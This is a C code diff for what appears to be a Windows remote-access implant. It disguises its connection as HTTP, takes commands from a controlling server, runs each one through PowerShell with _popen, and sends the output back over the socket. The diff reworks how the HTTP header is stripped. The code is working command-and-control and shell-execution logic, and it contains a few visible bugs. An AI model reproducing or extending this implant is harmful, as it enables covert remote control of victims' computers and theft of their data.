@@ -141,43 +141,47 @@ int main(void) {
         printf("Server sent: %s\n", serverMessage);
 
         // Because the Connecttion is disguised in HTTP, there are a handful of headers we don't care about.
-        const char* httpOK = "HTTP/1.1 200 OK";
-        const char* contentLength = "Content-Length:";
-        const char* contentType = "Content-Type: text/plain; charset=utf-8";
-        if ((strncmp(serverMessage, httpOK, 17) != 0) && (strstr(serverMessage, contentLength) == NULL) && (strncmp(serverMessage, contentType, 41) != 0) && (serverMessage[0] != '\0')) {
-            encrypt(serverMessage);
-            const char* keepAlive = "KEEP_ALIVE";
-            // Check to make sure the message isn't a keep alive message
-            if (strncmp(serverMessage, keepAlive, 11) != 0) {
-                // Create the string to run the command in the format "Powershell.exe -Command /"[cmdlet]/"
-                char command[1100] = "Powershell.exe -Command \"";
-                strcat_s(command, rsize_t(1100), serverMessage);
-                strcat_s(command, rsize_t(1100), "\"");
+        // To do this, we just move the pointer past the wherever the substring variable is found
+        const char* substring = "charset=utf-8\n\n";
+        char* startOfActualData = strstr(serverMessage, substring);
+        startOfActualData += strnlen(substring, 19);
+        strcpy_s(serverMessage, sizeof(serverMessage), startOfActualData);
+
+        // Decrypt the Message from the server
+        encrypt(serverMessage);
+        const char* keepAlive = "KEEP_ALIVE";
+        printf("Server Message: %s\m", serverMessage);
+
+        // Check to make sure the message isn't a keep alive message
+        if (strncmp(serverMessage, keepAlive, 11) != 0) {
+            // Create the string to run the command in the format "Powershell.exe -Command /"[cmdlet]/"
+            char command[1100] = "Powershell.exe -Command \"";
+            strcat_s(command, rsize_t(1100), serverMessage);
+            strcat_s(command, rsize_t(1100), "\"");
                 
-                // Create variables to run and store command output
-                char commandOutput[8192];
-                FILE* pipe;
+            // Create variables to run and store command output
+            char commandOutput[8192];
+            FILE* pipe;
 
-                // Open the command for reading
-                pipe = _popen(command, "r");
-                if (pipe == NULL) {
-                    printf("Error opening pipe.\n");
-                    return 1;
-                }
-
-                // Read the output a line and send it back to the Server
-                while (fgets(commandOutput, 8190, pipe) != NULL) {
-                    // fgets appends \0 to the end, but not \n. The next 3 lines overwrite the \0 with \n, and then append \0 after
-                    int len = strnlen(commandOutput, 8190) + 1;
-                    commandOutput[len] = '\n';
-                    commandOutput[len + 1] = '\0';
-                    printf("%s", commandOutput);
-                    send(clientSocket, commandOutput, strnlen(commandOutput, 8192), 0);
-                }
-
-                // Close the pipe
-                _pclose(pipe);
+            // Open the command for reading
+            pipe = _popen(command, "r");
+            if (pipe == NULL) {
+                printf("Error opening pipe.\n");
+                return 1;
             }
+
+            // Read the output a line and send it back to the Server
+            while (fgets(commandOutput, 8190, pipe) != NULL) {
+                // fgets appends \0 to the end, but not \n. The next 3 lines overwrite the \0 with \n, and then append \0 after
+                int len = strnlen(commandOutput, 8190);
+                commandOutput[len] = '\n';
+                commandOutput[len + 1] = '\0';
+                printf("%s", commandOutput);
+                send(clientSocket, commandOutput, strnlen(commandOutput, 8192), 0);
+            }
+
+            // Close the pipe
+            _pclose(pipe);
         }
     }
 
